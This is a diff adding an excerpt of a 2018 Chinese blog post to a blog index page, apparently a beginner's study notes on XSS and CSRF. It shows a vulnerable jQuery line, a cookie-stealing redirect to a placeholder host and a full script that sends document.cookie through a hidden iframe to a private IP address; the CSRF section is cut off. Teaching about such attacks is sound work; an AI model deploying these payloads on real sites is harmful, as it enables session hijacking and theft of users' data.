@@ -182,6 +182,98 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-web开发常见的安全问题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/11/web开发常见的安全问题/">Web安全之XSS和CSRF</a>
+    </h1>
+  
+
+                    
+                        <a href="/2018/08/11/web开发常见的安全问题/" class="archive-article-date">
+  	<time datetime="2018-08-11T00:39:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-11</time>
+</a>
+                            
+            </header>
+            
+                <!-- 目录内容 -->
+                
+                        <!-- 目录内容结束 -->
+                        <div class="article-entry" itemprop="articleBody">
+                            
+                                                <p>今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧!</p>
+<h1 id="Web安全之XSS和CSRF"><a href="#Web安全之XSS和CSRF" class="headerlink" title="Web安全之XSS和CSRF"></a>Web安全之XSS和CSRF</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="XSS定义"><a href="#XSS定义" class="headerlink" title="XSS定义"></a>XSS定义</h3><blockquote>
+<p><code>跨站脚本攻击</code>，通过客户端脚本语言在一个论坛发帖(其他<code>input</code>类型的输入框也可以)中发布一段恶意的<code>JavaScript</code>代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫<code>XSS！</code></p>
+</blockquote>
+<h3 id="XSS跨站脚本攻击-Cross-site-Scipting"><a href="#XSS跨站脚本攻击-Cross-site-Scipting" class="headerlink" title="XSS跨站脚本攻击 Cross site Scipting"></a>XSS跨站脚本攻击 Cross site Scipting</h3><blockquote>
+<p>主要原因是多数用户的输入没有被转义，而直接执行。<br>XSS可以获取到用户cookie或隐私客户端信息。</p>
+</blockquote>
+<h3 id="比如通过location-hash"><a href="#比如通过location-hash" class="headerlink" title="比如通过location.hash"></a>比如通过location.hash</h3><blockquote>
+<p>假设某个网站有一段脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;#box&quot;).html(location.hash.replace(&apos;#&apos;,&apos;&apos;));</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>攻击者看到伪造URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = &quot;http://a.com?&quot;+document.cookie;获取用户cookie!</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>也就是说<strong>它利用了网站的某个漏洞，然后把脚本注入该网页</strong>，让其他登录的用户登录后就会把该用户的信息获取到并发送给一个恶意的服务器。把压缩后的url发给某个登录的用户</p>
+<h3 id="一个网页的评论有漏洞-没有转义"><a href="#一个网页的评论有漏洞-没有转义" class="headerlink" title="一个网页的评论有漏洞(没有转义)"></a>一个网页的评论有漏洞(没有转义)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">(function(window, document) &#123;</span><br><span class="line">    // 构造泄露信息用的 URL</span><br><span class="line">    var cookies = document.cookie;</span><br><span class="line">    var xssURIBase = &quot;http://192.168.123.123/myxss/&quot;;</span><br><span class="line">    var xssURI = xssURIBase + window.encodeURI(cookies);</span><br><span class="line">    // 建立隐藏 iframe 用于通讯</span><br><span class="line">    var hideFrame = document.createElement(&quot;iframe&quot;);</span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line">    hideFrame.style.display = &quot;none&quot;;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    // 开工</span><br><span class="line">    document.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(window, document);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>那么这段代码就会被执行，这个代码会携带着登录用户的信息传输给<a href="http://192.168.123.123/myxss/服务器，然后服务器的代码就会接收了用户的隐式信息" target="_blank" rel="noopener">http://192.168.123.123/myxss/服务器，然后服务器的代码就会接收了用户的隐式信息</a>!<br>主要原理就是注入脚本到</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
+                                                    
+
+                                                        
+        </div>
+        <div class="article-info article-info-index">
+            
+                    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web安全 前端</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+                        
+
+                            
+                                <p class="article-more-link">
+                                    <a class="article-more-a" href="/2018/08/11/web开发常见的安全问题/">
+                                        展开全文 >></a>
+                                </p>
+                                
+
+                                    
+                                                <div class="clearfix"></div>
+        </div>
+        </div>
+</article>
+
+            <aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+                
+  
     <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
     <div class="article-inner">
         
@@ -347,6 +439,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web安全 前端</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
